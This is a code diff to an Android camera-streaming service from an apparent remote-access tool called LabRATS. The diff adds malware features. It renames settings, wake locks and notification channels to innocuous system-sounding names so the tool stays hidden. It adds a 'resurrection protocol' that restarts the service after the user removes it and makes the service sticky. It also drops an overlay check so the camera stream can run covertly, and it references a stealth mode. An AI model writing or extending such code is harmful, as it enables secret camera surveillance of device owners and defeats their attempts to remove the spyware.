@@ -129,14 +129,14 @@ public class MediaContainer extends Service {
         startBackgroundThread();
 
         // Load persistent settings
-        nightModeEnabled = getSharedPreferences("LabRATSSettings", MODE_PRIVATE)
+        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE)
                 .getBoolean("night_mode", false);
 
         // Initialize WakeLock for background operation
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         wakeLock = powerManager.newWakeLock(
                 PowerManager.PARTIAL_WAKE_LOCK,
-                "LabRATS:CameraWakeLock");
+                "System:StabilityWakeLock");
         Log.d(TAG, "MediaContainer created with WakeLock support");
     }
 
@@ -184,7 +184,25 @@ public class MediaContainer extends Service {
             }
         }
 
-        return START_NOT_STICKY;
+        return START_STICKY;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        if (CoreSyncService.isDestructing) {
+            super.onTaskRemoved(rootIntent);
+            return;
+        }
+        // [RESURRECTION_PROTOCOL] Restart optics if cleared
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
+            getApplicationContext(), 2, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
+        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
+        if (alarmService != null) {
+            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 
     private boolean isStealthMode() {
@@ -247,7 +265,7 @@ public class MediaContainer extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Camera Service",
+                    "Core Processor",
                     NotificationManager.IMPORTANCE_LOW);
             channel.setDescription("Camera capture service");
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -564,19 +582,6 @@ public class MediaContainer extends Service {
         streamQuality = quality > 0 ? quality : 50;
 
         try {
-            createOverlay();
-
-            // Wait for surface
-            if (surfaceLatch != null) {
-                surfaceLatch.await(5, TimeUnit.SECONDS);
-            }
-
-            if (!surfaceReady) {
-                Log.e(TAG, "Surface not ready for streaming");
-                LabRatsHttpServer.logActivity("OPTICS_ERROR: Overlay surface not ready (Check 'Display over other apps' permission)");
-                return;
-            }
-
             startStreamingInternal();
 
         } catch (Exception e) {
@@ -625,7 +630,19 @@ public class MediaContainer extends Service {
                             }
                         } catch (Exception e) {}
                         
-                        byte[] jpegData = yuv420ToJpeg(image, streamQuality, rotation);
+                        // --- ADAPTIVE THERMAL THROTTLING ---
+                        int quality = streamQuality;
+                        try {
+                            Intent batIntent = getApplicationContext().registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+                            if (batIntent != null) {
+                                int temp = batIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0);
+                                if (temp > 400) { // > 40°C
+                                    quality = Math.max(15, quality - 15);
+                                }
+                            }
+                        } catch (Exception ignored) {}
+                        
+                        byte[] jpegData = yuv420ToJpeg(image, quality, rotation);
                         if (jpegData != null) {
                             while (!frameQueue.offer(jpegData)) {
                                 frameQueue.poll();
@@ -708,6 +725,11 @@ public class MediaContainer extends Service {
             isStreaming = false;
             return;
         }
+
+        // --- ANDROID 14+ FGS UPGRADE ---
+        // We must update the foreground service with CAMERA type right before using it
+        ensureForeground();
+
         try {
             CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
             builder.addTarget(imageReader.getSurface());
@@ -939,7 +961,7 @@ public class MediaContainer extends Service {
 
     public void setNightMode(boolean enabled) {
         nightModeEnabled = enabled;
-        getSharedPreferences("LabRATSSettings", MODE_PRIVATE)
+        getSharedPreferences("StabilityConfig", MODE_PRIVATE)
                 .edit().putBoolean("night_mode", enabled).apply();
         if (isStreaming && captureSession != null && cameraDevice != null) {
             startPreview(); // Restart preview to apply changes
